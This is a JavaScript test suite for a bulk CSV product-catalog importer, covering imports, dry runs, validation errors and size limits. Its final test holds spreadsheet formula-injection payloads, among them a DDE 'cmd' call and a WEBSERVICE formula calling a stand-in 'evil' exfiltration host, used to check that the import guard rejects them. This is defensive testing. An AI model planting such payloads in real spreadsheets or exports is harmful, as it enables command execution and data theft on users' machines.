"use strict";
/**
 * catalog-import — bulk CSV import into products + variants + prices
 * + inventory.
 *
 * Layer 1 because every successful row writes to four catalog tables
 * via the externalDb-shaped query function. The test loads the live
 * migration into an in-memory SQLite so the schema CHECK / UNIQUE /
 * FK constraints exercise end-to-end (e.g. a duplicate slug across
 * runs surfaces as a row-error, not a swallowed exception).
 *
 * Coverage:
 *   - happy path: 3 products / 5 variants imports cleanly
 *   - multiple-variants-per-product de-dupe by slug
 *   - dry_run returns the same counts but writes no rows
 *   - bad header row → throws (no rows processed)
 *   - bad slug / SKU in a row → row-error, other rows succeed
 *   - duplicate slug across runs → row-error on the second upload
 *   - csv > maxBytes / > maxRows → throws
 *   - formula-injection cell (`=cmd|...`) refused by guardCsv
 */

var nodeFs   = require("node:fs");
var nodePath = require("node:path");
var { DatabaseSync } = require("node:sqlite");

var bShop   = require("../../lib");
var helpers = require("../helpers");
var check   = helpers.check;
var assert  = helpers.assert;

var MIGRATION_PATH = nodePath.resolve(__dirname, "..", "..", "migrations-d1", "0001_catalog.sql");

function _splitSchema(text) {
  var noComments = text.replace(/--[^\n]*\n/g, "\n");
  return noComments.split(/;\s*(?:\n|$)/).map(function (s) { return s.trim(); }).filter(Boolean);
}

function _makeQuery() {
  var db = new DatabaseSync(":memory:");
  db.prepare("PRAGMA foreign_keys = ON").run();
  var schema = nodeFs.readFileSync(MIGRATION_PATH, "utf8");
  _splitSchema(schema).forEach(function (s) { db.prepare(s).run(); });
  return async function (sql, params) {
    var stmt = db.prepare(sql);
    var verb = sql.replace(/^\s+|\s*--[^\n]*\n/g, "").trim().split(/\s+/)[0].toUpperCase();
    if (verb === "INSERT" || verb === "UPDATE" || verb === "DELETE" || verb === "REPLACE") {
      var info = stmt.run.apply(stmt, params || []);
      return {
        rows:      [],
        rowCount:  Number(info.changes),
        lastRowId: info.lastInsertRowid != null ? Number(info.lastInsertRowid) : null,
      };
    }
    var rows = stmt.all.apply(stmt, params || []);
    return { rows: rows, rowCount: rows.length };
  };
}

var HEADER = "product_slug,product_title,product_status,product_description,variant_sku,variant_title,variant_weight_grams,price_currency,price_amount_minor,inventory_qty";

function _build(rows) {
  return [HEADER].concat(rows).join("\n") + "\n";
}

async function _happyPath() {
  var catalog = bShop.catalog.create({ query: _makeQuery() });
  var imp     = bShop.catalogImport.create({ catalog: catalog });

  var csv = _build([
    "demo-1,Demo product 1,active,A description,DEMO-1-A,Standard,250,USD,2999,100",
    "demo-1,Demo product 1,active,A description,DEMO-1-B,Large,400,USD,3499,50",
    "demo-2,Demo product 2,active,Another,DEMO-2-A,One size,500,USD,4999,25",
    "demo-3,Demo product 3,draft,Third,DEMO-3-A,V1,100,USD,1999,10",
    "demo-3,Demo product 3,draft,Third,DEMO-3-B,V2,150,USD,2199,15",
  ]);

  var result = await imp.importCsv({ csv: csv });
  check("happy errors empty",     result.errors.length === 0);
  check("happy 3 products",       result.created.products === 3);
  check("happy 5 variants",       result.created.variants === 5);
  check("happy 5 prices",         result.created.prices === 5);
  check("happy 5 inventory rows", result.created.inventory_rows === 5);
  check("happy rows count",       result.rows === 5);
  check("happy not dry_run",      result.dry_run === false);

  // Verify the catalog actually has the rows.
  var p = await catalog.products.bySlug("demo-1");
  check("demo-1 persisted", p && p.title === "Demo product 1" && p.status === "active");
  var variants = await catalog.variants.listForProduct(p.id);
  check("demo-1 has 2 variants", variants.length === 2);
  var price = await catalog.prices.current(variants[0].id, "USD");
  check("demo-1 variant price persisted", price && price.amount_minor > 0);
  var inv = await catalog.inventory.get("DEMO-1-A");
  check("demo-1 inventory persisted", inv && inv.stock_on_hand === 100);
}

async function _multiVariantDedupe() {
  var catalog = bShop.catalog.create({ query: _makeQuery() });
  var imp     = bShop.catalogImport.create({ catalog: catalog });

  // 4 rows, all sharing the same product_slug, but the title /
  // status / description in rows 2-4 are different from row 1 — the
  // importer takes row 1's values and ignores the rest.
  var csv = _build([
    "shared,Real Title,active,Real description,SHARED-A,A,100,USD,1000,5",
    "shared,IGNORED,draft,IGNORED DESC,SHARED-B,B,100,USD,1000,5",
    "shared,IGNORED,draft,IGNORED DESC,SHARED-C,C,100,USD,1000,5",
    "shared,IGNORED,draft,IGNORED DESC,SHARED-D,D,100,USD,1000,5",
  ]);

  var result = await imp.importCsv({ csv: csv });
  check("dedupe errors empty",    result.errors.length === 0);
  check("dedupe 1 product",       result.created.products === 1);
  check("dedupe 4 variants",      result.created.variants === 4);

  var p = await catalog.products.bySlug("shared");
  check("first row title wins",   p.title === "Real Title");
  check("first row status wins",  p.status === "active");
}

async function _dryRun() {
  var query = _makeQuery();
  var catalog = bShop.catalog.create({ query: query });
  var imp     = bShop.catalogImport.create({ catalog: catalog });

  var csv = _build([
    "dry-1,Dry 1,active,A,DRY-1-A,Std,100,USD,1000,10",
    "dry-1,Dry 1,active,A,DRY-1-B,Lg,200,USD,2000,20",
    "dry-2,Dry 2,active,B,DRY-2-A,One,300,USD,3000,30",
  ]);

  var result = await imp.importCsv({ csv: csv, dry_run: true });
  check("dry_run flag echoed",   result.dry_run === true);
  check("dry_run errors empty",  result.errors.length === 0);
  check("dry_run counts match",  result.created.products === 2 && result.created.variants === 3);

  // Nothing actually persisted.
  var p = await catalog.products.bySlug("dry-1");
  check("dry_run wrote no products", p === null);
  var inv = await catalog.inventory.get("DRY-1-A");
  check("dry_run wrote no inventory", inv === null);
}

async function _badHeader() {
  var catalog = bShop.catalog.create({ query: _makeQuery() });
  var imp     = bShop.catalogImport.create({ catalog: catalog });

  // Wrong column order — swap variant_sku and product_title.
  var badHeader = "product_slug,variant_sku,product_status,product_description,product_title,variant_title,variant_weight_grams,price_currency,price_amount_minor,inventory_qty";
  var csv = badHeader + "\ndemo-1,DEMO-1-A,active,desc,Title,Std,100,USD,1000,10\n";
  await assert.rejects(imp.importCsv({ csv: csv }), /header column/);

  // Missing a column entirely.
  var short = "product_slug,product_title,product_status\ndemo-1,Demo,active\n";
  await assert.rejects(imp.importCsv({ csv: short }), /header row must have/);

  // No content at all.
  await assert.rejects(imp.importCsv({ csv: "" }), /no rows/);

  // Bad input type.
  await assert.rejects(imp.importCsv({}), /input\.csv required/);
}

async function _badSlugOrSkuRowError() {
  var catalog = bShop.catalog.create({ query: _makeQuery() });
  var imp     = bShop.catalogImport.create({ catalog: catalog });

  // Row 2 → bad slug ("Has Spaces"), row 3 → bad SKU ("bad sku"),
  // row 4 → bad numeric, row 5 → good (verifies others succeed).
  var csv = _build([
    "ok-1,OK 1,active,desc,OK-1-A,Std,100,USD,1000,10",
    "Has Spaces,Bad,active,desc,BS-A,Std,100,USD,1000,10",
    "ok-2,OK 2,active,desc,bad sku here,Std,100,USD,1000,10",
    "ok-3,OK 3,active,desc,OK-3-A,Std,not-a-number,USD,1000,10",
    "ok-4,OK 4,active,desc,OK-4-A,Std,100,USD,1000,10",
  ]);

  var result = await imp.importCsv({ csv: csv });
  check("3 row-errors collected",   result.errors.length === 3);
  check("row-error has row_index",  result.errors[0].row_index >= 2 && result.errors[0].row_index <= 6);
  // Good rows persisted: ok-1 and ok-4. ok-2 and ok-3 created the
  // parent product but failed at variant create — so products is 4
  // (ok-1, Has Spaces failed before product create, ok-2, ok-3,
  // ok-4) actually: only the 1st row of Has-Spaces fails at the
  // bySlug-validate step, no product created. Verify by querying.
  var ok1 = await catalog.products.bySlug("ok-1");
  var ok4 = await catalog.products.bySlug("ok-4");
  check("ok-1 persisted",  ok1 !== null);
  check("ok-4 persisted",  ok4 !== null);
  var _bad = await catalog.products.bySlug("ok-1");  // any-slug lookup of "Has Spaces" would throw — skip
  check("at least 2 variants persisted", result.created.variants >= 2);
}

async function _duplicateSlugAcrossRuns() {
  var catalog = bShop.catalog.create({ query: _makeQuery() });
  var imp     = bShop.catalogImport.create({ catalog: catalog });

  var first = _build([
    "dup-1,Dup 1,active,desc,DUP-1-A,Std,100,USD,1000,10",
  ]);
  var r1 = await imp.importCsv({ csv: first });
  check("first upload OK", r1.errors.length === 0 && r1.created.products === 1);

  // Same slug, NEW SKU. The product already exists; the variant
  // attempts to attach to the existing product. Since SKU is new,
  // it should succeed.
  var secondNewSku = _build([
    "dup-1,Dup 1,active,desc,DUP-1-B,Std2,200,USD,2000,20",
  ]);
  var r2 = await imp.importCsv({ csv: secondNewSku });
  check("second-upload same-slug new-sku succeeds (existing product reused)",
    r2.errors.length === 0 && r2.created.products === 0 && r2.created.variants === 1);

  // Same slug AND same SKU — variant insert fails on UNIQUE constraint.
  var thirdDupeSku = _build([
    "dup-1,Dup 1,active,desc,DUP-1-A,Std,100,USD,1000,10",
  ]);
  var r3 = await imp.importCsv({ csv: thirdDupeSku });
  check("third-upload duplicate SKU row-errors", r3.errors.length === 1);
  check("third-upload no variant created",       r3.created.variants === 0);

  // First product still intact.
  var p = await catalog.products.bySlug("dup-1");
  check("original product not corrupted", p !== null && p.title === "Dup 1");
}

async function _sizeLimits() {
  var catalog = bShop.catalog.create({ query: _makeQuery() });
  var imp     = bShop.catalogImport.create({ catalog: catalog });

  // maxBytes — build a CSV just over a tiny cap.
  var tinyCap = 200;   // bytes
  var csv = _build([
    "big-1,Big 1,active,A description longer than the tiny cap is,BIG-1-A,Std,100,USD,1000,10",
    "big-1,Big 1,active,A description longer than the tiny cap is,BIG-1-B,Lg,200,USD,2000,20",
  ]);
  await assert.rejects(
    imp.importCsv({ csv: csv, maxBytes: tinyCap }),
    /exceeds maxBytes/
  );

  // maxRows — make a CSV with 3 rows, cap at 2.
  var small = _build([
    "rl-1,RL 1,active,d,RL-1-A,S,100,USD,1000,10",
    "rl-2,RL 2,active,d,RL-2-A,S,100,USD,1000,10",
    "rl-3,RL 3,active,d,RL-3-A,S,100,USD,1000,10",
  ]);
  await assert.rejects(
    imp.importCsv({ csv: small, maxRows: 2 }),
    /maxRows/
  );

  // Validation: bad opt shapes throw.
  await assert.rejects(imp.importCsv({ csv: small, maxBytes: -1 }),  /maxBytes/);
  await assert.rejects(imp.importCsv({ csv: small, maxRows:  0 }),   /maxRows/);
}

async function _formulaInjectionRefused() {
  var catalog = bShop.catalog.create({ query: _makeQuery() });
  var imp     = bShop.catalogImport.create({ catalog: catalog });

  // Cell starts with `=` and contains a dangerous-function call —
  // guardCsv strict profile refuses the whole upload before any row
  // is processed. The product_description cell is the carrier
  // because it's the most plausible free-text field in a real
  // operator CSV.
  var csv = _build([
    'demo-1,Demo 1,active,"=cmd|/c calc!A1",DEMO-1-A,Std,100,USD,1000,10',
  ]);
  await assert.rejects(imp.importCsv({ csv: csv }), /content-safety guard/);

  // Different shape — leading `+` in a numeric-looking cell.
  var csv2 = _build([
    'demo-2,Demo 2,active,desc,DEMO-2-A,"+SUM(A1:A10)",100,USD,1000,10',
  ]);
  await assert.rejects(imp.importCsv({ csv: csv2 }), /content-safety guard/);

  // Dangerous-function denylist hit via WEBSERVICE.
  var csv3 = _build([
    'demo-3,Demo 3,active,"=WEBSERVICE(\\"http://evil/exfil\\")",DEMO-3-A,Std,100,USD,1000,10',
  ]);
  await assert.rejects(imp.importCsv({ csv: csv3 }), /content-safety guard/);
}

async function _factoryValidation() {
  assert.throws(function () { bShop.catalogImport.create({}); }, /catalog required/);
}

async function run() {
  await _happyPath();
  await _multiVariantDedupe();
  await _dryRun();
  await _badHeader();
  await _badSlugOrSkuRowError();
  await _duplicateSlugAcrossRuns();
  await _sizeLimits();
  await _formulaInjectionRefused();
  await _factoryValidation();
}

module.exports = { run: run };
